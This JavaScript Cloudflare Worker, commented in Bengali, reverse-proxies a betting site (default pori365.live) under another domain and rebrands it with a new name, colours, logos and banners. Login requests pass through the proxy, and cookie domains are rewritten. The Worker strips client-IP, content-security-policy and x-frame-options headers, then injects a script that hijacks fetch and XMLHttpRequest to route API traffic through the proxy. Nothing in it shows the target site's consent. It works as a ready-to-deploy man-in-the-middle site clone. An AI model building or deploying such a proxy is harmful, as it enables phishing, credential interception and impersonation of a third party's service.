let cachedConfig = null;
let lastCacheTime = 0;

// ★ গ্যাপ ছাড়া ১০০% ফুল-উইথ NO IMAGE প্লেসহোল্ডার
const NO_IMAGE_SVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none" width="100%" height="100%">
  <rect width="100" height="100" fill="#2a2a2a"/>
  <rect width="96" height="96" x="2" y="2" fill="none" stroke="#444" stroke-width="1" stroke-dasharray="2,2"/>
  <text x="50" y="50" dominant-baseline="middle" text-anchor="middle" font-family="Arial, sans-serif" font-size="12" font-weight="bold" fill="#666">NO IMAGE</text>
</svg>`;

async function getDynamicConfig() {
  const now = Date.now();
  if (cachedConfig && (now - lastCacheTime < 5000)) return cachedConfig;

  try {
    const firestoreUrl = "https://firestore.googleapis.com/v1/projects/rivers-proxy/databases/(default)/documents/config/main";
    const res = await fetch(firestoreUrl);
    if (res.ok) {
      const json = await res.json();
      const fields = json.fields || {};
      
      let dbBanners = fields.banners?.arrayValue?.values?.map(v => v.stringValue) || [];
      let finalBanners = new Array(12).fill(""); 
      for(let i=0; i<12; i++) {
          finalBanners[i] = (dbBanners[i] && dbBanners[i] !== "") ? dbBanners[i] : ""; 
      }

      // ★ নতুন: স্লাইডার ডাটা ফেচ করা
      let dbSliders = fields.sliders?.arrayValue?.values?.map(v => v.stringValue) || [];
      let finalSliders = new Array(5).fill(""); 
      for(let i=0; i<5; i++) {
          finalSliders[i] = (dbSliders[i] && dbSliders[i] !== "") ? dbSliders[i] : ""; 
      }

      cachedConfig = {
        targetDomain: fields.targetDomain?.stringValue?.replace(/^(https?:\/\/)?(www\.)?/i, '').split('/')[0] || "pori365.live",
        themeColor: fields.themeColor?.stringValue || "#FCAF04",
        favicon: fields.favicon?.stringValue || "",
        logo: fields.logo?.stringValue || "",
        loginBg: fields.loginBg?.stringValue || "",
        banners: finalBanners,
        sliders: finalSliders // ★ নতুন স্লাইডার অ্যারে যুক্ত হলো
      };
      lastCacheTime = now;
      return cachedConfig;
    }
  } catch (err) {}
  
  return cachedConfig || { targetDomain: "pori365.live", themeColor: "#FCAF04", favicon: "", logo: "", loginBg: "", banners: new Array(12).fill(""), sliders: new Array(5).fill("") };
}

export default {
  async fetch(request, env, ctx) {
    const config = await getDynamicConfig();
    const url = new URL(request.url);
    const targetDomain = config.targetDomain;
    const proxyDomain = url.hostname;

    let autoBrandName = proxyDomain.split('.')[0].replace(/-/g, ' ').replace(/\b\w/g, l => l.toUpperCase());

    // ==========================================
    // ১. কাস্টম SVG ইন্টারসেপ্ট (Play Now Color) ★
    // ==========================================
    if (url.pathname.includes('gamex.689a2e64e46ee4d9cc7e.svg')) {
      const customSvg = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" preserveAspectRatio="none"> <polygon points="15,0 100,0 100,100 0,100" fill="${config.themeColor}" /> </svg>`;
      return new Response(customSvg, {
        headers: {
          "Content-Type": "image/svg+xml; charset=utf-8",
          "Access-Control-Allow-Origin": "*",
          "Cache-Control": "max-age=86400"
        }
      });
    }

    // ==========================================
    // ২. গেম ব্যানার ஸ்பুফার (MainImage)
    // ==========================================
    if (url.pathname.includes('/assets/New/MainImage')) {
      let bannerIndex = 0;
      const match = url.pathname.match(/MainImage(?:\s*%20|\s)*\(?(\d+)\)?/i);
      if (match && match[1]) { bannerIndex = parseInt(match[1]); }
      
      let customImageUrl = config.banners[bannerIndex];
      
      if (!customImageUrl || customImageUrl === "") {
         return new Response(NO_IMAGE_SVG, { headers: { 'Content-Type': 'image/svg+xml', 'Cache-Control': 'no-cache', 'Access-Control-Allow-Origin': '*' } });
      }
      
      if (customImageUrl.startsWith('data:image')) {
          const base64Data = customImageUrl.split(',')[1];
          const binaryStr = atob(base64Data);
          const bytes = new Uint8Array(binaryStr.length);
          for (let i = 0; i < binaryStr.length; i++) { bytes[i] = binaryStr.charCodeAt(i); }
          return new Response(bytes.buffer, { headers: { 'Content-Type': 'image/webp', 'Cache-Control': 'public, max-age=60', 'Access-Control-Allow-Origin': '*' } });
      }

      const imgResponse = await fetch(customImageUrl);
      let newHeaders = new Headers(imgResponse.headers);
      newHeaders.set('Cache-Control', 'public, max-age=60');
      newHeaders.set('Access-Control-Allow-Origin', '*');
      return new Response(imgResponse.body, { status: 200, headers: newHeaders });
    }

    // ==========================================
    // ৩. API ও Live TV ইন্টারসেপ্টর (★ Login Bypass Fixed ★)
    // ==========================================
    if (url.pathname.startsWith('/_api_proxy/')) {
      const targetApiUrlStr = request.url.replace(new RegExp(`^https?://${proxyDomain}/_api_proxy/`), '');

      if (request.method === "OPTIONS") {
        return new Response(null, { headers: { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Methods": "*", "Access-Control-Allow-Headers": "*", "Access-Control-Max-Age": "86400" } });
      }

      const apiReqHeaders = new Headers(request.headers);
      apiReqHeaders.delete('Host');
      apiReqHeaders.set('Origin', `https://${targetDomain}`);
      apiReqHeaders.set('Referer', `https://${targetDomain}/`);

      // ★ লগইন কাজ করার আসল জায়গা (Request Body Modify) ★
      let reqBody = request.body;
      if (["POST", "PUT", "PATCH"].includes(request.method)) {
        let textBody = await request.text();
        textBody = textBody.replace(new RegExp(proxyDomain, 'g'), targetDomain);
        reqBody = textBody;
      }

      let apiRes = await fetch(targetApiUrlStr, {
        method: request.method,
        headers: apiReqHeaders,
        body: reqBody,
        redirect: 'manual'
      });

      let apiResHeaders = new Headers(apiRes.headers);
      apiResHeaders.set("Access-Control-Allow-Origin", "*");

      const setCookie = apiResHeaders.get("Set-Cookie");
      if (setCookie) {
        let updatedCookie = setCookie.replace(/domain=[^;]+/gi, `domain=${proxyDomain}`);
        apiResHeaders.set("Set-Cookie", updatedCookie);
      }

      const apiContentType = apiResHeaders.get("Content-Type") || "";
      if (apiContentType.includes("mpegurl") || targetApiUrlStr.includes('.m3u8')) {
        let m3u8Text = await apiRes.text();
        m3u8Text = m3u8Text.replace(/(https?:\/\/[^\s"'<>]+)/g, `https://${proxyDomain}/_api_proxy/$1`);
        return new Response(m3u8Text, { status: apiRes.status, headers: apiResHeaders });
      }

      return new Response(apiRes.body, { status: apiRes.status, headers: apiResHeaders });
    }

    // ==========================================
    // ৪. রিভার্স প্রক্সি রিকোয়েস্ট
    // ==========================================
    const targetUrl = new URL(request.url);
    targetUrl.hostname = targetDomain;
    targetUrl.protocol = 'https:';

    const reqHeaders = new Headers(request.headers);
    reqHeaders.set("Host", targetDomain);
    reqHeaders.set("Origin", `https://${targetDomain}`);
    reqHeaders.set("Referer", `https://${targetDomain}/`);
    reqHeaders.delete("cf-connecting-ip");
    reqHeaders.delete("x-real-ip");

    let response = await fetch(targetUrl.toString(), { method: request.method, headers: reqHeaders, body: request.body, redirect: 'manual' });
    let resHeaders = new Headers(response.headers);
    resHeaders.set("Access-Control-Allow-Origin", "*");
    resHeaders.delete("content-security-policy");
    resHeaders.delete("x-frame-options");

    if (resHeaders.has("Location")) {
      let location = resHeaders.get("Location");
      resHeaders.set("Location", location.replace(new RegExp(`https?://${targetDomain}`, 'gi'), `https://${proxyDomain}`));
    }

    const contentType = resHeaders.get("Content-Type") || "";

    // ==========================================
    // ৫. HTML/CSS মডিফিকেশন (YOUR EXACT REPLACEMENTS)
    // ==========================================
    if (contentType.includes("text/html") || contentType.includes("application/javascript") || contentType.includes("text/css")) {
      let text = await response.text();

      if(!contentType.includes("text/css")) {
          text = text.replace(/(?<![\/\.a-zA-Z-])pori365(?![a-zA-Z-])/gi, autoBrandName);
          text = text.replace(/(?<![\/\.a-zA-Z-])pori(?![a-zA-Z-])/gi, autoBrandName.split(' ')[0]);
      }

      // ★ আপনার আগের কোডের হুবহু কালার রিপ্লেসমেন্ট লজিক ★
      text = text.replace(/rgb\(\s*20\s*,\s*128\s*,\s*94\s*\)/gi, config.themeColor);
      text = text.replace(/#14805e/gi, config.themeColor);
      text = text.replace(/rgb\(\s*0\s*,\s*153\s*,\s*153\s*\)/gi, config.themeColor);
      text = text.replace(/#009999/gi, config.themeColor);

      if (config.logo && !contentType.includes("text/css")) {
          text = text.replace(/\/static\/media\/logo[^"'\s\)\\]+/gi, config.logo);
      }

      if (contentType.includes("text/html")) {
        
        if(config.favicon) {
           text = text.replace(/<link rel="icon"[^>]+>/gi, '');
           text = text.replace(/<link rel="shortcut icon"[^>]+>/gi, '');
           text = text.replace('<head>', `<head>\n<link rel="icon" type="image/x-icon" href="${config.favicon}">\n<link rel="shortcut icon" href="${config.favicon}">`);
        }

        // ★ Login Bypass Script & Image Replacer ★
        const interceptorScript = `
        <script>
          (function() {
            const proxyDom = "${proxyDomain}"; const targetDom = "${targetDomain}";
            const customLogo = "${config.logo}";
            // ★ নতুন: এডমিন থেকে পাওয়া স্লাইডারগুলো
            const customSliders = ${JSON.stringify(config.sliders || [])};
            const validSliders = customSliders.filter(s => s !== "");

            const needsProxy = function(url) {
              if (typeof url !== 'string') return false;
              return url.includes('trueexch.com') || url.includes('aax-eu1314.com') || url.includes('.m3u8') || url.includes('.ts');
            };

            const origFetch = window.fetch;
            window.fetch = async function() {
              let args = Array.prototype.slice.call(arguments);
              if (typeof args[0] === 'string' && needsProxy(args[0])) {
                if (!args[0].includes('/_api_proxy/')) { args[0] = 'https://' + proxyDom + '/_api_proxy/' + args[0]; }
              } else if (args[0] instanceof Request && needsProxy(args[0].url)) {
                if (!args[0].url.includes('/_api_proxy/')) { args[0] = new Request('https://' + proxyDom + '/_api_proxy/' + args[0].url, args[0]); }
              }
              if (args[1] && args[1].body && typeof args[1].body === 'string') {
                args[1].body = args[1].body.split(proxyDom).join(targetDom);
              }
              return origFetch.apply(this, args);
            };

            const origOpen = XMLHttpRequest.prototype.open;
            XMLHttpRequest.prototype.open = function(method, url) {
              if (typeof url === 'string' && needsProxy(url)) {
                 if (!url.includes('/_api_proxy/')) { url = 'https://' + proxyDom + '/_api_proxy/' + url; }
              }
              this._url = url;
              return origOpen.apply(this, arguments);
            };

            const origSend = XMLHttpRequest.prototype.send;
            XMLHttpRequest.prototype.send = function(body) {
              if (body && typeof body === 'string') { body = body.split(proxyDom).join(targetDom); }
              return origSend.call(this, body);
            };

            const observer = new MutationObserver((mutations) => {
              if(customLogo) {
                  const bgLogos = document.querySelectorAll('h1.top-logo, .top-logo');
                  bgLogos.forEach(el => { if (el.style.backgroundImage !== 'url("' + customLogo + '")') el.style.setProperty('background-image', 'url("' + customLogo + '")', 'important'); });
                  const imgLogos = document.querySelectorAll('.home_logo img, img[src*="logo"]');
                  imgLogos.forEach(img => { if (img.src && !img.src.includes(customLogo) && (img.closest('.home_logo') || img.src.includes('/static/media/logo'))) img.src = customLogo; });
              }

              // ★ নতুন: টপ স্লাইডার রিপ্লেস করার কোড (আপনার দেওয়া স্ক্রিনশট অনুযায়ী)
              if (validSliders.length > 0) {
                 const sliderImgs = document.querySelectorAll('.slick-slide img');
                 sliderImgs.forEach(img => {
                    // স্ক্রিনশটে দেখা যাচ্ছে ইমেজ URL এ banner-uploads বা txnrep আছে
                    if (img.src && (img.src.includes('banner-uploads') || img.src.includes('txnrep') || img.src.includes('trueexch.com:5018'))) {
                       const slideDiv = img.closest('.slick-slide');
                       if (slideDiv) {
                          const dataIndex = parseInt(slideDiv.getAttribute('data-index') || "0");
                          // Slick slider এর নেগেটিভ index ফিক্স করার ফর্মুলা
                          const mappedIndex = ((dataIndex % validSliders.length) + validSliders.length) % validSliders.length;
                          
                          if (img.src !== validSliders[mappedIndex]) {
                              img.src = validSliders[mappedIndex];
                              // স্লাইডারের স্টাইল যেন ঠিক থাকে
                              img.style.width = "100%";
                          }
                       }
                    }
                 });
              }
            });
            document.addEventListener("DOMContentLoaded", () => { observer.observe(document.documentElement, { childList: true, subtree: true, attributes: true, attributeFilter: ['style', 'class', 'src'] }); });
          })();
        </script>
        `;

        const customCssOverrides = `
        <style> 
          dl.entrance-title { border-bottom-color: ${config.themeColor} !important; } 
          div.login_main { background-image: linear-gradient(235deg, ${config.themeColor} 21%, ${config.themeColor}) !important; background-color: ${config.themeColor} !important; } 

          ${config.logo ? `
          h1.top-logo, .top-logo { background-image: url('${config.logo}') !important; background-size: contain !important; background-position: left center !important; background-repeat: no-repeat !important; background-color: transparent !important; width: 280px !important; height: 50px !important; min-width: 250px !important; margin-left: 5px !important; }
          .home_logo img, img[src*="/static/media/logo"] { content: url('${config.logo}') !important; max-width: 260px !important; height: auto !important; object-fit: contain !important; }
          ` : ''}

          ${config.loginBg ? `
          header.login-head, .login-head, .login-bg { background-image: url('${config.loginBg}') !important; background-size: cover !important; background-position: center !important; }
          ` : ''}

          /* ★ ফুল উইথ NO IMAGE ফিক্স */
          img[src*="/assets/New/MainImage"] { 
             width: 100% !important; 
             height: 100% !important; 
             object-fit: fill !important; 
             display: block !important; 
          }
        </style>`;

        text = text.replace('<head>', '<head>' + interceptorScript + customCssOverrides);
      }

      text = text.replace(new RegExp(targetDomain, 'g'), proxyDomain);
      text = text.replace(new RegExp(`http://${proxyDomain}`, 'g'), `https://${proxyDomain}`);

      return new Response(text, { status: response.status, headers: resHeaders });
    }

    return new Response(response.body, { status: response.status, headers: resHeaders });
  }
};
